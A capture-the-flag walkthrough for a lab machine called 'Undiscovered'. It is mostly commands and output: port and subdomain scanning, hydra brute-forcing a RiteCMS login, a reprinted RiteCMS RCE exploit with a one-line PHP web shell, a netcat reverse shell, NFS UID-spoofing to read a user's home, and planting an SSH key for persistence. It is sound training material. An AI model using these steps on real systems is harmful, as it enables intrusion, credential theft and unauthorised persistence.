<p>June 24, 2025</p>
<h1>Undiscovered</h1>

<h2>rustscan</h2>

```bash
:~# rustscan -a 10.10.144.57 --ulimit 5000 -- -A -Pn
...
ORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0m4DmvKkWm3OoELtyKxq4G9yM29DEggmEsfKv2fzZh1G6EiPS/pKPQV/u8InqwPyyJZv82Apy4pVBYL7KJTTZkxBLbrJplJ6YnZD5xZMd8tf4uLw5ZCilO6oLDKH0pchPmQ2x2o5x2Xwbzfk4KRbwC+OZ4f1uCageOptlsR1ruM7boiHsPnDO3kCujsTU/4L19jJZMGmJZTpvRfcDIhelzFNxCMwMUwmlbvhiCf8nMwDaBER2HHP7DKXF95uSRJWKK9eiJNrk0h/K+3HkP2VXPtcnLwmbPhzVHDn68Dt8AyrO2d485j9mLusm4ufbrUXSyfM9JxYuL+LDrqgtUxxP
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAcr7A7L54JP/osGx6nvDs5y3weM4uwfT2iCJbU5HPdwGHERLCAazmr/ss6tELaj7eNqoB8LaM2AVAVVGQXBhc8=
|   256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII9WA55JtThufX7BcByUR5/JGKGYsIlgPxEiS0xqLlIA
80/tcp    open  http     syn-ack Apache httpd 2.4.18
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://undiscovered.thm
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      32927/tcp6  nlockmgr
|   100021  1,3,4      34582/udp   nlockmgr
|   100021  1,3,4      41717/tcp   nlockmgr
|   100021  1,3,4      53479/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs      syn-ack 2-4 (RPC #100003)
41717/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
```

<h2>wfuzz</h2>

```bash
:~# wfuzz -u undiscovered.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.undiscovered.thm" --hc 404 --hw 26
...
000000492:   200        68 L     341 W    4584 Ch     "manager"                                               
000000517:   200        68 L     341 W    4626 Ch     "dashboard"                                             
000000567:   200        68 L     341 W    4584 Ch     "newsite"                                               
000000631:   200        68 L     341 W    4542 Ch     "forms"                                                 
000000634:   200        68 L     341 W    4668 Ch     "maintenance"                                           
000000523:   200        82 L     341 W    4650 Ch     "deliver"                                               
000000613:   200        68 L     341 W    4584 Ch     "develop"                                               
000000629:   200        68 L     341 W    4584 Ch     "network"                                               
000000666:   200        68 L     341 W    4521 Ch     "view"                                                  
000000675:   200        68 L     341 W    4605 Ch     "mailgate"                                              
000000679:   200        68 L     341 W    4521 Ch     "play"                                                  
000000681:   200        68 L     341 W    4542 Ch     "start"                                                 
000000686:   200        83 L     341 W    4599 Ch     "booking"                                               
000000692:   200        68 L     341 W    4605 Ch     "terminal"                                              
000000695:   200        68 L     341 W    4521 Ch     "gold"                                                  
000000697:   200        68 L     341 W    4605 Ch     "internet"                                              
000000703:   200        68 L     341 W    4626 Ch     "resources"                                             
000009543:   400        12 L     53 W     422 Ch      "#www"                                                  
000010595:   400        12 L     53 W     422 Ch      "#mail"                                                 
000047764:   400        12 L     53 W     422 Ch      "#smtp"                                                 
000103209:   400        12 L     53 W     422 Ch      "#pop3"      
```

<h2>/etc/hosts</h2>

```bash
TargetIP undiscovered.thm manager.undiscovered.thm deliver.undiscovered.thm
```

![image](https://github.com/user-attachments/assets/8361aed0-b96f-454c-b597-2ef7b1a68516)

![image](https://github.com/user-attachments/assets/3aa18ede-45c5-4486-93a2-111df851e797)

<h2>Exploit Database</h2>

![image](https://github.com/user-attachments/assets/6f6a1ea1-e6c7-4855-b4a7-82051eba9ef5)

![image](https://github.com/user-attachments/assets/24f569f7-4167-475b-989c-eb733221f1e7)

```bash
# Exploit Title: RiteCMS 2.2.1 - Authenticated Remote Code Execution
# Date: 2020-07-03
# Exploit Author: Enes Özeser
# Vendor Homepage: http://ritecms.com/
# Version: 2.2.1
# Tested on: Linux
# CVE: CVE-2020-23934

1- Go to following url. >> http://(HOST)/cms/
2- Default username and password is admin:admin. We must know login credentials.
3- Go to "Filemanager" and press "Upload file" button.
4- Choose your php web shell script and upload it. 
     
PHP Web Shell Code == <?php system($_GET['cmd']); ?>

5- You can find uploaded file there. >> http://(HOST)/media/(FILE-NAME).php
6- We can execute a command now. >> http://(HOST)/media/(FILE-NAME).php?cmd=id

(( REQUEST ))

GET /media/(FILE-NAME).php?cmd=id HTTP/1.1
Host: (HOST)
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://(HOST)/cms/index.php?mode=filemanager&directory=media
Connection: close
Cookie: icms[device_type]=desktop; icms[guest_date_log]=1593777486; PHPSESSID=mhuunvasd12cveo52fll3u
Upgrade-Insecure-Requests: 1


(( RESPONSE ))

HTTP/1.1 200 OK
Date: Fri, 06 Jul 2020 20:02:13 GMT
Server: Apache/2.4.43 (Debian)
Content-Length: 14
Connection: close
Content-Type: text/html; charset=UTF-8
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<h2></h2>

<h2>hydra></h2>

```bash
:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.144.57 http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" -f
...
[DATA] attacking http-post-form://10.10.144.57:80/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong
[80][http-post-form] host: 10.10.144.57   login: admin   password: princess
[STATUS] attack finished for 10.10.144.57 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
...
```

```bash
:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" -f
...
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
[STATUS] attack finished for deliver.undiscovered.thm (valid pair found)
1 of 1 target successfully completed, 1 valid password found
...
```

<h2>http://deliver.undiscovered.thm/cms/index.php?mode=filemanager&action=upload&directory=media</h2>

![image](https://github.com/user-attachments/assets/06795787-be4c-43c4-8f76-47a51a2badd0)

![image](https://github.com/user-attachments/assets/3cc541b0-e83d-453e-a0b3-ba4173d33acf)

![image](https://github.com/user-attachments/assets/846fec61-1e6d-4eb2-a278-ed6e17a9abd5)

![image](https://github.com/user-attachments/assets/35299161-559b-420c-acf6-cd2f02255ef7)

```bash
:~# nc -nlvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.144.57 43366
Linux undiscovered 4.4.0-189-generic #219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 11:00:35 up 57 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@undiscovered:/$ ^Z
[1]+  Stopped                 nc -nlvp 9001
:~# stty raw -echo
:~# nc -nlvp 9001

www-data@undiscovered:/$ export TERM=xterm
www-data@undiscovered:/$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/home/william	*(rw,root_squash)
www-data@undiscovered:/$ cat /etc/passwd | grep william
william:x:3003:3003::/home/william:/bin/bash
www-data@undiscovered:/$ 
```

```bash
:~# sudo useradd -u 3003 -d /dev/shm william
:~# cat /etc/passwd | grep william
william:x:3003:3003::/dev/shm:/bin/sh
root@ip-10-10-253-139:~# sudo su william
$ bash
william@ip-10-10-253-139:/root$ ls
48636.txt  burp.json   Desktop	  Instructions	Pictures  rev.php  Scripts  socat   thinclient_drives
48915.py   CTFBuilder  Downloads  mnt		Postman   Rooms    snap     ss.php  Tools
william@ip-10-10-253-139:/root$ cd mnt
william@ip-10-10-253-139:/root/mnt$ ls
admin.sh  script  user.txt
william@ip-10-10-253-139:/root/mnt$ cat user.txt
THM{8d7b7299cccd1796a61915901d0e091c}
william@ip-10-10-253-139:/root/mnt$ 
```


```bash
william@ip-10-10-253-139:/root/mnt$ ssh-keygen -f william
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in william
Your public key has been saved in william.pub
The key fingerprint is:
SHA256:+r9KN/HdCMg6nIErh7PrUjGeFEW5ObT4HJYrtJwvLio william@ip-10-10-253-139
The key's randomart image is:
+---[RSA 3072]----+
|     oo.         |
|    . o          |
|     + =         |
|    * O. . .     |
|   = X.+S + .    |
|    O.++ + o o o |
|   .+o+ * o . o .|
|E o .=.o o .     |
|o. ==o  ooo.     |
+----[SHA256]-----+
william@ip-10-10-253-139:/root/mnt$ cat ./william.pub > .ssh/authorized_keys
william@ip-10-10-253-139:/root/mnt$ 


```
